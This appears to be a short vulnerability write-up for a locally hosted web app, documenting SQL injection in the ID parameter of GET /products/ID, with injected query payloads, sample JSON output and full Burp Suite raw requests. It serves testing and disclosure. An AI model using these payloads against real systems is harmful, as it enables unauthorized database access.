# SQL Injection
SQL injection is a database query manipulation attack against structured query language (SQL) that allows attackers to escape the intended query to perform unintended/malicious actions.

## Exploitation
**Prerequisites:** _None_

**Location:** _GET /products/ID_

The ID parameter of GET /products/ID can be escaped since SpringBoot on this endpoint does not implement any protects filtering or isolating for clause fields.  Below is an exploitation example:

    # Receives Product ID 1 information
    GET /products/1 or p.id=2  order by 13

    # Receives Product ID 2 information when it should be Product ID 1
    GET /products/1 or p.id=2  order by 16

You'l see that adding _or p.id=2 order by 16_ changed the product output showing effectively that SQL was escaped

Successful exploitation looks like:

    {
    "id": ...,
    "name": ...,
    "brand": ...,
    "description": ...,
    "price": ...,
    "stock": ...,
    "productReviews": [{...}, {...}, ...],
    "averageReviewGrade": ...,
    "tagNames": [...],
    "image": ...
    }

## Burp Suite Example Exploitation

    # First Request
    GET /products/1 or p.id=2  order by 13 HTTP/1.1
    Host: 127.0.0.1:8081
    sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
    Accept: application/json, text/plain, */*
    X-XSRF-TOKEN: 877dd681-4a9f-41f0-ae74-d1ada25aab32
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    sec-ch-ua-platform: "Windows"
    Origin: http://127.0.0.1:4200
    Sec-Fetch-Site: same-site
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:4200/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: XSRF-TOKEN=877dd681-4a9f-41f0-ae74-d1ada25aab32; JSESSIONID=1C77B365979B077008298700287FA604
    Connection: close

    # Second Request
    GET /products/1 or p.id=2  order by 16 HTTP/1.1
    Host: 127.0.0.1:8081
    sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
    Accept: application/json, text/plain, */*
    X-XSRF-TOKEN: 877dd681-4a9f-41f0-ae74-d1ada25aab32
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    sec-ch-ua-platform: "Windows"
    Origin: http://127.0.0.1:4200
    Sec-Fetch-Site: same-site
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:4200/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: XSRF-TOKEN=877dd681-4a9f-41f0-ae74-d1ada25aab32; JSESSIONID=1C77B365979B077008298700287FA604
    Connection: close


